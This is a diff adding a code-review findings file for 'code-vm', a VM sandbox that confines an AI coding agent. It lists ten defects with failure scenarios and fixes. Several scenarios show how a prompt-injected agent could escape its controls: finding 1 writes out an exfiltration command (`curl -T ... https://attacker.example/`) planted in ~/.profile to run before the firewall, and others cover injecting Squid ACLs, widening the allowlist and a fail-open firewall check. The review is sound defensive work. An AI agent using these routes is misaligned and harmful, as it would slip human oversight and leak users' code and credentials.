@@ -1,0 +1,226 @@
+# code-vm Code Review Findings
+
+**Date:** 2026-07-31
+**Scope:** the whole implementation as of commit `982c3c9` — Go packages under
+`internal/` and `cmd/`, guest scripts under `internal/guest/files/`, the Lima
+template, `test-vm-sandbox.sh`, `mise.toml`, and the CI workflow. The `docs/`
+tree was excluded.
+**Method:** workflow-backed review at high effort — parallel finders per
+correctness angle, then an independent adversarial verifier per candidate
+location. 35 agents; all ten findings below survived verification as
+`CONFIRMED`. Line references were re-checked against the working tree after the
+review completed.
+**Status:** nothing has been fixed. This file records the findings so the work
+can be triaged and picked up deliberately.
+
+## The pattern
+
+Most findings are **regressions relative to the Docker sandbox**, not novel
+bugs: places where porting a control from `entrypoint.sh` into
+`sandbox-boot.service` silently dropped a property the container version had.
+The two most serious (1 and 4) are both of that shape. Two findings (7 and 9)
+are arguably design questions rather than defects and are marked as such.
+
+---
+
+## 1. Agent-writable rc files execute pre-firewall at every boot
+
+**`internal/guest/files/scripts/update-agent-clis.sh:20`** — severity: high
+
+`run_as_agent` invokes `bash -lc`, a **login** shell, which sources
+`/home/devuser/.profile` and `.bashrc`. Those files are owned by the agent and
+writable by it during any normal session. `sandbox-boot.sh` runs this script
+first, before `init-firewall.sh` — deliberately, because the installers need
+egress — so anything in those rc files runs with **no iptables policy and no
+Squid**.
+
+*Failure scenario:* a prompt-injected agent appends
+`curl -T /home/devuser/repos/secret.tar https://attacker.example/` to
+`~/.profile`. On the next `code-vm stop` / `code-vm start`, that command runs
+with completely unfiltered egress. The allowlist never sees the traffic and
+`proxy-log` shows nothing.
+
+*Fix direction:* drop `-l` (the explicit `env` block already supplies `HOME`,
+`PATH`, and `XDG_RUNTIME_DIR`, so the login shell buys nothing), and/or make the
+agent's shell rc files root-owned like the `.claude` tree. Dropping `-l` is the
+cheap, targeted change.
+
+## 2. Credential deny rules are lost on restart while the secrets persist
+
+**`internal/session/credentials.go:18`**, with the consuming side at
+**`internal/guest/files/scripts/lock-settings.sh:80`** — severity: high
+
+`denyRulesPath` lives under `/run/sandbox-secrets/`, which is tmpfs, but the
+*rendered credential files* are written to the guest disk (`root:devuser 0444`)
+and survive reboots. The two lifetimes disagree.
+
+*Failure scenario:* a session in workspace A renders
+`/home/devuser/.gradle/gradle.properties` and merges its deny rules. After a VM
+restart, a session in workspace B runs `lock-settings.sh`, which finds no
+`deny-rules.json` and writes `settings.json` **without** the deny patterns — the
+credential file is still on disk and group-readable, and Claude Code may now
+read it.
+
+*Fix direction:* either persist the deny rules alongside the rendered files, or
+have the render step remove rendered credentials whose deny rules are gone, so
+the file and its protection share one lifetime.
+
+## 3. Host GID collision leaves no `devuser` group and bricks the VM
+
+**`internal/guest/files/scripts/provision-system.sh:24`** — severity: high
+(availability)
+
+`getent group "$AGENT_GID"` tests for a group with that **GID**, not one named
+`devuser`. When the host user's primary GID already exists in the guest —
+gid 100 (`users`) on many Linux distros, gid 20 on macOS hosts — `groupadd` is
+skipped, so no group *named* `devuser` ever exists. Every later
+`chown root:devuser` and `install -g devuser` then fails with "invalid group".
+
+*Failure scenario:* a host user with GID 100 runs `code-vm start`.
+`lock-settings.sh` dies at its first `chown` under `set -e`,
+`/run/firewall-verify` is never written, and `limactl start` hangs until the
+300 s readiness probe times out. The VM never becomes usable, with no clear
+diagnostic.
+
+*Note:* this did not surface during implementation only because the development
+host's GID (1000) happens not to collide.
+
+*Fix direction:* check `getent group "$AGENT_USER"` for the name, and derive the
+group to use from the GID that is actually present rather than assuming the name.
+
+## 4. Firewall self-verification fails open instead of closed
+
+**`internal/guest/files/scripts/init-firewall.sh:251`** (verify file written) vs
+**`:254`** (`VERIFY_OK` gate) — severity: high
+
+The script writes `/run/firewall-verify` **before** it evaluates `VERIFY_OK` and
+exits 1. The Lima readiness probe only checks that the file *exists*. In the
+Docker sandbox the identical `exit 1` aborted `entrypoint.sh` under `set -e`, so
+the container died and the agent never ran.
+
+*Failure scenario:* a verification check stops matching (e.g. an iptables output
+format change). `init-firewall.sh` exits 1 and `sandbox-boot.service` fails —
+but the verify file already exists, the probe passes, `limactl start` reports
+success, and `code-vm` runs Claude in a VM whose firewall failed its own
+verification. Nothing host-side reads the file's *contents*; only the
+informational `status` and `firewall` commands do.
+
+*Fix direction:* write the verify file only after `VERIFY_OK` passes (and have
+the probe or `ensureRunning` treat a failed `sandbox-boot.service` as fatal).
+This restores the fail-closed property without weakening any check.
+
+## 5. The gateway-REJECT check is satisfied by the Squid ACCEPT rule
+
+**`internal/guest/files/scripts/init-firewall.sh:236`** — severity: medium
+
+`gw_reject` greps for any line containing `owner UID match $AGENT_UID`. The
+agent-to-Squid ACCEPT rule appended earlier (`:192`) matches that string too, so
+the check reports `yes` whether or not the gateway REJECT rule exists.
+
+*Failure scenario:* the REJECT rule is dropped by a refactor or an iptables
+failure. `/run/firewall-verify` still says `AGENT_GATEWAY_REJECT=yes`, the suite
+assertion still passes, and the agent can reach host services while both the
+security suite and `code-vm status` report the protection as active.
+
+*Fix direction:* match the rule specifically — include the target and the
+gateway address in the grep, not just the UID-owner match.
+
+## 6. Predictable `/tmp` staging paths allow ACL injection
+
+**`internal/session/allowlist.go:111`**, same pattern at
+**`internal/session/gitidentity.go:63`** — severity: medium
+
+Files are staged into the guest at deterministic, agent-writable paths:
+`/tmp/10-<sha256-prefix>.conf` and `/tmp/code-vm-gitconfig`. Root then
+`install`s them into place. The window between `limactl copy` and `install` is a
+race the agent can win.
+
+*Failure scenario:* an agent already running in the VM computes the workspace
+hash, then rewrites the staged fragment with
+`acl allowed_domains dstdomain .attacker.com` after the copy but before the
+install. `squid -k reconfigure` loads attacker-chosen ACLs.
+
+*Fix direction:* stage into a root-only directory (e.g. under `/run/sandbox/`
+created `0700 root:root`), or use an unpredictable per-invocation filename.
+
+## 7. `.sandbox-domains` is agent-authored input that widens the allowlist
+
+**`internal/session/allowlist.go:81`** — severity: medium; **arguably by design**
+
+`ApplyAllowlist` reads `.sandbox-domains` from the workspace, which is mounted
+writable and is exactly what the agent edits. An agent can therefore author its
+own allowlist entry and have the next `code-vm` invocation install it as root.
+
+*Failure scenario:* the agent writes `.attacker.example` into
+`<workspace>/.sandbox-domains`; the next session installs it and reloads Squid,
+after which repository contents and rendered credential values can be POSTed
+out, with only a proxy-log line as evidence.
+
+*Design note:* the container sandbox has the same property, and per-project
+domain files are a deliberate feature. Worth deciding explicitly: leave it
+documented as an accepted limitation, or require host-side confirmation when the
+file changes (a diff prompt on first use of a new domain).
+
+## 8. Every firewall mode switch wipes the Squid audit log
+
+**`internal/guest/files/scripts/init-firewall.sh:129`** — severity: medium
+
+`install -m 0644 -o proxy -g proxy /dev/null /var/log/squid/access.log`
+truncates the log on every run, and `set-firewall-mode.sh` re-execs
+`init-firewall.sh` — so switching modes destroys the audit trail.
+
+*Failure scenario:* a user sees suspicious denied requests and runs
+`code-vm firewall audit` to investigate. The switch truncates `access.log`, and
+`code-vm proxy-log denied` shows nothing — the evidence the switch was meant to
+help inspect is gone.
+
+*Fix direction:* create the log only when absent (`[ -f ] ||`), or rotate rather
+than truncate.
+
+## 9. The security suite is excluded from CI on a stale premise
+
+**`.github/workflows/ci.yml:3`** — severity: medium; **plan decision worth revisiting**
+
+CI runs `fmt-check`, `lint`, `test:unit`, and `build`, but not
+`mise run test:vm`. The sibling Docker sandbox runs its security suite on every
+push/PR (see the parent repo's `CLAUDE.md`). The stated reason — GitHub-hosted
+runners lack nested KVM — is out of date: GitHub's Linux runners have exposed
+`/dev/kvm` since 2023.
+
+*Failure scenario:* a PR that reorders `sandbox-boot.sh` so the firewall never
+applies, or breaks the settings lock, passes CI green and merges. It ships in
+the next VM users provision.
+
+*Fix direction:* add a second job that runs `mise run test:vm` on
+`ubuntu-latest` and see whether KVM is actually available; keep it non-blocking
+at first if runtime is a concern.
+
+## 10. No post-firewall connectivity check at boot
+
+**`internal/guest/files/scripts/sandbox-boot.sh:19`** — severity: low
+
+The container `entrypoint.sh` curled `https://api.anthropic.com` after the
+firewall closed and printed an explicit warning on failure. The VM boot sequence
+ends at `init-firewall.sh` with no such check, so a firewall that passes *rule*
+verification but breaks actual *connectivity* is silent.
+
+*Failure scenario:* DNS breaks under the new rules — e.g. the LIMADNS DNAT
+parsing yields no allow rules on a Lima version whose nat-chain format differs.
+Every iptables self-check still passes, the verify file is written, `code-vm`
+starts normally, and every Claude API call hangs with no startup diagnostic.
+
+*Fix direction:* re-add the reachability probe as a final, non-fatal step with a
+loud warning.
+
+---
+
+## Suggested triage order
+
+1. **4** and **5** — self-verify defects; small, self-contained, and they restore
+   guarantees the suite currently only appears to check.
+2. **3** — one-line-class fix that prevents an unusable VM for a large class of
+   hosts.
+3. **1** — drop `-l`; removes an unfiltered-egress channel.
+4. **2** and **6** — lifetime and staging fixes; more design thought needed.
+5. **8**, **10** — small robustness/observability fixes.
+6. **7**, **9** — decisions to make rather than defects to fix.
